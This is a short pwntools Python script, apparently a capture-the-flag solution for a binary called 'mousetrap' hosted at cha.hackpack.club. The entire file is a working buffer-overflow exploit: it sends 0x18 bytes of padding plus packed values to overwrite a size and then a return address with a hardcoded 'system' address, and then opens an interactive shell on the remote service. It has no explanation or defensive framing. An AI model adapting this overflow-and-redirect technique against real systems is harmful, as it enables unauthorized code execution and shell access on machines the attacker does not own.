from pwn import *
context.update(arch='amd64', os='linux', log_level='debug')

p = remote("cha.hackpack.club", 41719)
#p = process("mousetrap")

p.recvrepeat(1)

p.send('a'*0x18+p64(0xff))

p.recvrepeat(1)

addr_system = 0x400718

p.send('a'*0x18 + p64(addr_system))
#p.send('a'*0x18)

p.interactive()
